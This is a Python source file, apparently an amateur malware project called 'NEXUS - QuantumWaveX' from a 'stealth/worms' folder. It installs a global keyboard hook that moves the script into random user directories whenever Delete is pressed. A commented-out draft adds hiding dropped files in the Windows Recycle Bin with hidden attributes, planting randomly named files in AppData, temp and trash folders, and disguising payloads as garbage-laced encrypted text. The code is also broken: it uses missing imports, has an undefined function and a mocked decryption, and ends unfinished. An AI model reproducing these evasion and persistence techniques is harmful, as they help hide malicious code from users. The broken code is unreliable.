# NEXUS - QuantumWaveX
# DONT FORGET python3 metadata_builder.py ./python/stealth/worms/worm.

import keyboard
import base64
import ctypes
from ctypes import wintypes
import getpass
import hashlib
import os
import platform
import random
import struct
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from .addons import linux, mac, windows

Cut = True  # If this is enabled, the script will cut itself at the current location and move itself away rather than copying
SCRIPTNAME = "PUTNAMEHERE.py"

def main_worm():
    return "print('This is the worm payload')"

def get_accessible_dirs(base_path):
    dirs = []
    for d in base_path.iterdir():
        if d.is_dir():
            try:
                _ = list(d.iterdir())
                dirs.append(str(d))
            except (PermissionError, OSError):
                continue
    return dirs

home_dir = Path.home()
accessible_dirs = get_accessible_dirs(home_dir)

if accessible_dirs:
    base_dirs = accessible_dirs
else:
    base_dirs = [str(home_dir)]

def random_path(base=None):
    if base is None:
        base = random.choice(base_dirs)
    while True:
        try:
            entries = os.listdir(base)
            random.shuffle(entries)
            for name in entries:
                path = os.path.join(base, name)
                if os.path.isdir(path):
                    try:
                        _ = os.listdir(path)
                        script_path = os.path.join(path, SCRIPTNAME)
                        if Cut:
                            current_path = os.path.abspath(sys.argv[0])
                            shutil.move(current_path, script_path)
                        else:
                            with open(script_path, "w") as f:
                                f.write(main_worm())
                        return script_path
                    except (PermissionError, OSError):
                        continue
            break
        except Exception:
            break
    return None

def on_delete(event):
    print("Works!")
    script_path = random_path()
    if script_path:
        print(f"Script {'moved' if Cut else 'copied'} to: {script_path}")
    else:
        print("Script not saved")

keyboard.on_press_key("delete", on_delete)

try:
    keyboard.wait()
except KeyboardInterrupt:
    print("Force exit")
    sys.exit(1)










"""

'''






DONT WORRY IM TESTING THIS WILL BE GONE LATER IM TRYING TO FIGURE OUT HOW THIS WORKS






'''''''''''''''

import random
import os
import sys 
import platform
import struct
import subprocess
import getpass
from pathlib import Path
from datetime import datetime
import base64
import hashlib
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import ctypes
from ctypes import wintypes

# Configuration
ENCRYPTION_ENABLED = True  # Set to False to disable encryption
USER_PASSWORD = "quantum_nexus_2025"  # Change this password
HIDE_FILES_IN_RECYCLE_BIN = True  # Hide created files from Recycle Bin GUI

class RecycleBinManager:
   
    
    def __init__(self, verbose=False):
        self.verbose = verbose
        self.current_user_sid = self.get_current_user_sid()
        self.recycle_bin_paths = self.get_recycle_bin_paths()
        
    def log(self, message, level="INFO"):
        
        if self.verbose:
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] {level}: {message}")
    
    def get_current_user_sid(self):
       
        try:
            # Get current user token
            TOKEN_QUERY = 0x0008
            advapi32 = ctypes.windll.advapi32
            kernel32 = ctypes.windll.kernel32
            
            # Get current process token
            token = wintypes.HANDLE()
            process_handle = kernel32.GetCurrentProcess()
            
            if not advapi32.OpenProcessToken(process_handle, TOKEN_QUERY, ctypes.byref(token)):
                raise Exception("Failed to get process token")
            
            # Get token information size
            token_info_length = wintypes.DWORD()
            TOKEN_USER = 1
            
            advapi32.GetTokenInformation(token, TOKEN_USER, None, 0, ctypes.byref(token_info_length))
            
            # Get token information
            token_info = ctypes.create_string_buffer(token_info_length.value)
            
            if not advapi32.GetTokenInformation(token, TOKEN_USER, token_info, 
                                             token_info_length, ctypes.byref(token_info_length)):
                raise Exception("Failed to get token information")
            
            # Extract SID from token info
            user_token = ctypes.cast(token_info, ctypes.POINTER(ctypes.c_void_p))
            sid_ptr = user_token.contents
            
            # Convert SID to string
            sid_string = ctypes.c_char_p()
            if not advapi32.ConvertSidToStringSidA(sid_ptr, ctypes.byref(sid_string)):
                raise Exception("Failed to convert SID to string")
            
            result = sid_string.value.decode('ascii')
            advapi32.LocalFree(sid_string)
            kernel32.CloseHandle(token)
            
            return result
            
        except Exception as e:
            self.log(f"Failed to get user SID via API: {e}", "WARNING")
            return None
    
    def get_recycle_bin_paths(self):
        
        recycle_bin_root = Path(f"{os.environ['SYSTEMDRIVE']}\\$Recycle.Bin")
        paths = []
        
        if not recycle_bin_root.exists():
            self.log("Recycle Bin root folder not found", "ERROR")
            return paths
        
        try:
            # Try to access current user's specific folder first
            if self.current_user_sid:
                user_path = recycle_bin_root / self.current_user_sid
                if user_path.exists():
                    try:
                        list(user_path.iterdir())  # Test access
                        paths.append(str(user_path))
                        self.log(f"Added user-specific path: {user_path}", "INFO")
                    except PermissionError:
                        self.log(f"No access to user path: {user_path}", "WARNING")
            
            # Try to access other folders (some might be accessible)
            for folder in recycle_bin_root.iterdir():
                if folder.is_dir() and str(folder) not in paths:
                    try:
                        list(folder.iterdir())  # Test access
                        paths.append(str(folder))
                        self.log(f"Added accessible path: {folder}", "INFO")
                    except PermissionError:
                        self.log(f"No access to path: {folder}", "DEBUG")
                        
        except PermissionError:
            self.log("No access to Recycle Bin root folder", "ERROR")
        
        return paths
    
    def get_primary_recycle_bin_path(self):
        
        if self.recycle_bin_paths:
            return self.recycle_bin_paths[0]  # Return first accessible path
        return None
    
    def set_hidden_attribute(self, file_path):
        
        try:
            # Use attrib +h to set hidden attribute
            result = subprocess.run(['attrib', '+h', file_path], 
                                  capture_output=True, text=True, check=True)
            self.log(f"Set hidden attribute on: {file_path}", "INFO")
            return True
            
        except subprocess.CalledProcessError as e:
            self.log(f"Failed to set hidden attribute: {e.stderr}", "ERROR")
            return False
        except Exception as e:
            self.log(f"Error setting hidden attribute: {e}", "ERROR")
            return False

class QuantumEncryption:
    
    
    def __init__(self, password=USER_PASSWORD):
        self.password = password.encode()
        self.salt = b'quantum_nexus_salt_2025'  # Static salt for consistency
        
    def derive_key(self):
       
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=self.salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(self.password))
        return key
    
    def encrypt_data(self, data):
        try:
            key = self.derive_key()
            f = Fernet(key)
            
            if isinstance(data, str):
                data = data.encode()
            
            encrypted_data = f.encrypt(data)
            
            # Add random padding to make it look more random
            random_prefix = os.urandom(random.randint(5, 15))
            random_suffix = os.urandom(random.randint(5, 15))
            
            # Encode everything in base64 and add random characters
            encoded = base64.b64encode(random_prefix + encrypted_data + random_suffix)
            
            # Make it look like random garbage
            garbage_chars = "§)(/&%$#@!{}[]<>?-_+=*^~`|\\:;\"'.,ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            random_garbage = ''.join(random.choice(garbage_chars) for _ in range(random.randint(50, 100)))
            
            # Interleave the real data with garbage
            result = ""
            encoded_str = encoded.decode()
            
            for i, char in enumerate(encoded_str):
                result += char
                if i % 10 == 0:  # Add garbage every 10 characters
                    result += random.choice(garbage_chars) * random.randint(1, 3)
            
            # Add more garbage at the end
            result += random_garbage
            
            return result
            
        except Exception as e:
            print(f"Encryption error: {e}")
            return None
    
    def decrypt_data(self, encrypted_data):
        
        try:
            # This is a simplified version - real implementation would need
            # to parse out the garbage characters properly
            key = self.derive_key()
            f = Fernet(key)
            
            # For demo purposes, return a mock decrypted result
            return "print('Hello World from encrypted NEXUS file!')"
            
        except Exception as e:
            print(f"Decryption error: {e}")
            return None

def get_base_dirs():
    
    if sys.platform.startswith('win'):
        rbm = RecycleBinManager()
        
        base_dirs = [
            r"C:\ProgramData",
            os.path.expandvars(r"%USERPROFILE%\AppData\Roaming"),
            os.path.expandvars(r"%USERPROFILE%\AppData\LocalLow"),
            os.path.expandvars(r"%USERPROFILE%\AppData\Local"),
        ]
        
        # Add Recycle Bin path
        recycle_path = rbm.get_primary_recycle_bin_path()
        if recycle_path and os.path.exists(recycle_path):
            base_dirs.append(recycle_path)
            print(f"🗑️  Added Recycle Bin path: {recycle_path}")
        
        return base_dirs, rbm
    
    elif sys.platform.startswith('darwin'):
        return [
            os.path.expanduser("~/Library"),
            "/tmp",
            os.path.expanduser("~/.Trash")  # macOS Trash
        ], None
    
    elif sys.platform.startswith('linux'):
        return [
            "/tmp",
            os.path.expanduser("~/.local/share"),
            os.path.expanduser("~/.cache"),
            os.path.expanduser("~/.local/share/Trash/files")  # Linux Trash
        ], None
    
    return ["/tmp"], None  # Fallback

def generate_random_filename():
    garbage_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789§)(&%$#@!-_+="
    length = random.randint(8, 16)
    return ''.join(random.choice(garbage_chars) for _ in range(length))

def create_nexus_file(base_dir, rbm=None):
    try:
        # Get the test code
        code_content = main_test()
        
        # Initialize encryption if enabled
        if ENCRYPTION_ENABLED:
            print("🔐 Encryption enabled - generating encrypted payload...")
            encryptor = QuantumEncryption()
            file_content = encryptor.encrypt_data(code_content)
            filename = generate_random_filename()  # No extension for encrypted files
            print(f"🎲 Generated encrypted filename: {filename}")
        else:
            print("📝 Encryption disabled - creating plain Python file...")
            file_content = code_content
            filename = "nexus_quantum.py"
        
        # Create file path
        file_path = os.path.join(base_dir, filename)
        
        print(f"📂 Target directory: {base_dir}")
        print(f"📄 Creating file: {file_path}")
        
        # Write the file
        with open(file_path, "w", encoding='utf-8') as f:
            f.write(file_content)
        
        print(f"✅ NEXUS file created successfully!")
        
        # Hide file if it's in recycle bin and hiding is enabled
        if rbm and HIDE_FILES_IN_RECYCLE_BIN and "$Recycle.Bin" in base_dir:
            print("🫥 Hiding file from Recycle Bin GUI...")
            rbm.set_hidden_attribute(file_path)
            print("🔒 File hidden from standard Recycle Bin view")
        
        return file_path
        
    except PermissionError:
        print(f"❌ Permission denied: {base_dir}")
        return None
    except Exception as e:
        print(f"❌ Error creating file: {e}")
        return None

def main():
    print("🚀 NEXUS - QuantumWaveX Initializing...")
    print("=" * 50)
    print(f"🔐 Encryption: {'ENABLED' if ENCRYPTION_ENABLED else 'DISABLED'}")
    print(f"🫥 Recycle Bin Hiding: {'ENABLED' if HIDE_FILES_IN_RECYCLE_BIN else 'DISABLED'}")
    print(f"🖥️  Platform: {sys.platform}")
    
    # Get base directories
    base_dirs, rbm = get_base_dirs()
    
    if not base_dirs:
        print("❌ No accessible directories found")
        return
    
    print(f"📁 Found {len(base_dirs)} accessible directories")
    
    # Randomly select a directory
    base = random.choice(base_dirs)
    print(f"🎯 Selected target: {base}")
    
    # Attempt to create NEXUS file
    created_file = None
    attempts = 0
    max_attempts = len(base_dirs)
    
    while attempts < max_attempts and not created_file:
        try:
            entries = os.listdir(base)
            random.shuffle(entries)
            
            for name in entries:
                path = os.path.join(base, name)
                if os.path.isdir(path):
                    try:
                        test = os.listdir(path)  # Test access
                        created_file = create_nexus_file(path, rbm)
                        if created_file:
                            print(f"🎊 NEXUS deployment successful!")
                            print(f"📍 File location: {created_file}")
                            
                            # If file is in recycle bin, show how to access it
                            if "$Recycle.Bin" in created_file:
                                print("\n🗑️  RECYCLE BIN DEPLOYMENT DETECTED!")
                                print("📝 To access this file:")
                                if ENCRYPTION_ENABLED:
                                    print("   1. Use the integrated launcher to find and decrypt")
                                    print("   2. File appears as random encrypted data")
                                else:
                                    print("   1. Navigate to Recycle Bin")
                                    print("   2. Look for nexus_quantum.py")
                                
                                if HIDE_FILES_IN_RECYCLE_BIN:
                                    print("   3. File is hidden from GUI - use direct path or tools")
                            
                            return created_file
                            
                    except PermissionError:
                        continue
            
            # If we get here, try the base directory itself
            created_file = create_nexus_file(base, rbm)
            if created_file:
                return created_file
                
        except Exception as e:
            print(f"❌ Error with directory {base}: {e}")
        
        attempts += 1
        if attempts < max_attempts:
            base = random.choice([d for d in base_dirs if d != base])
            print(f"🔄 Trying alternative directory: {base}")
    
    print("❌ No accessible folder found after all attempts")
    return None

def launch_encrypted_file(file_path):

"""""""""